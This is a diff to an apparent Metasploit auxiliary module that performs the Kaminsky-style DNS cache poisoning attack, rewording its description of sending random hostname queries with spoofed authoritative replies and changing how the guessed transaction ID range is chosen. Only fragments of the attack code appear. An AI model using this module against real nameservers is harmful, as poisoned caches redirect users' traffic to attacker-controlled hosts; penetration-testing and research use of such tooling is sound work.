@@ -15,14 +15,12 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			'Description'    => %q{
 				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
 				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a single
-				malicious host entry into the target nameserver by sending random sub-domain
+				malicious host entry into the target nameserver by sending random hostname
 				queries to the target DNS server coupled with spoofed replies to those
-				queries from the authoritative nameservers for the domain which contain a
-				malicious host entry for the hostname to be poisoned in the authority and
-				additional records sections.  Eventually, a guessed ID will match and the
-				spoofed packet will get accepted, and due to the additional hostname entry
-				being within bailiwick constraints of the original request the malicious host
-				entry will get cached.
+				queries from the authoritative nameservers for that domain. Eventually, a 
+				guessed ID will match, the spoofed packet will get accepted, and due to the 
+				additional hostname entry being within bailiwick constraints of the original
+				request the malicious host entry will get cached.
 			},
 			'Author'         => [ 'I)ruid', 'hdm' ],
 			'License'        => MSF_LICENSE,
@@ -122,7 +120,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		recons   = datastore['RECONS']
 		xids     = datastore['XIDS'].to_i
 		newttl   = datastore['TTL'].to_i
-		xidbase  = rand(65536-xids)
+		xidbase  = rand(20001) + 20000
 
 		domain = hostname.sub(/\w+\x2e/,"")
 		
